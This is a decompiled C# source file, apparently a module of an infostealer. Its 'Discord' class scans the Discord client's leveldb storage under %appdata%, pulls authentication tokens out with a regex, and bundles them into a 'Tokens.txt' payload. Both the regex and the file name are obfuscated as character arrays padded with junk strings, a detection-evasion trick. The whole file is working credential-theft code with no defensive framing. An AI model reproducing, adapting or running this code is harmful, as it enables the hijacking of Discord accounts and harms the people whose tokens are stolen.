using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

// Token: 0x02000021 RID: 33
public class Discord : FileScanner
{
	// Token: 0x060000B7 RID: 183 RVA: 0x00003867 File Offset: 0x00001A67
	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
	{
		return string.Empty;
	}

	// Token: 0x060000B8 RID: 184 RVA: 0x0000884C File Offset: 0x00006A4C
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			string directory = Environment.ExpandEnvironmentVariables("%appdata%\\discord\\Local Storage\\leveldb");
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*.log",
				Recoursive = false
			});
			list.Add(new FileScannerArg
			{
				Directory = directory,
				Pattern = "*.ldb",
				Recoursive = false
			});
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x060000B9 RID: 185 RVA: 0x0000386E File Offset: 0x00001A6E
	public static IEnumerable<ScannedFile> GetTokens()
	{
		List<ScannedFile> list = FileScanning.Search(new FileScanner[]
		{
			new Discord()
		});
		StringBuilder stringBuilder = new StringBuilder();
		foreach (ScannedFile scannedFile in list)
		{
			try
			{
				foreach (object obj in Regex.Matches(Encoding.UTF8.GetString(scannedFile.Body), new string(new char[]
				{
					'[',
					'A',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'-',
					'Z',
					'a',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'-',
					'z',
					'\\',
					'd',
					']',
					'{',
					'2',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'4',
					'}',
					'\\',
					'.',
					'[',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'\\',
					'w',
					'-',
					']',
					'{',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'6',
					'}',
					'\\',
					'.',
					'[',
					'\\',
					'w',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'-',
					']',
					'{',
					'2',
					'S',
					't',
					'r',
					'i',
					'n',
					'g',
					'7',
					'}'
				}).Replace("String", string.Empty)))
				{
					Match match = (Match)obj;
					try
					{
						string value = match.ToString().Trim();
						if (!stringBuilder.ToString().Contains(value))
						{
							stringBuilder.AppendLine(value);
						}
					}
					catch
					{
					}
				}
			}
			catch
			{
			}
		}
		yield return new ScannedFile
		{
			Body = Encoding.ASCII.GetBytes(stringBuilder.ToString()),
			NameOfFile = new string(new char[]
			{
				'T',
				'R',
				'e',
				'p',
				'l',
				'a',
				'c',
				'e',
				'o',
				'k',
				'R',
				'e',
				'p',
				'l',
				'a',
				'c',
				'e',
				'e',
				'n',
				'R',
				'e',
				'p',
				'l',
				'a',
				'c',
				'e',
				's',
				'.',
				't',
				'R',
				'e',
				'p',
				'l',
				'a',
				'c',
				'e',
				'x',
				't'
			}).Replace("Replace", string.Empty)
		};
		yield break;
	}
}
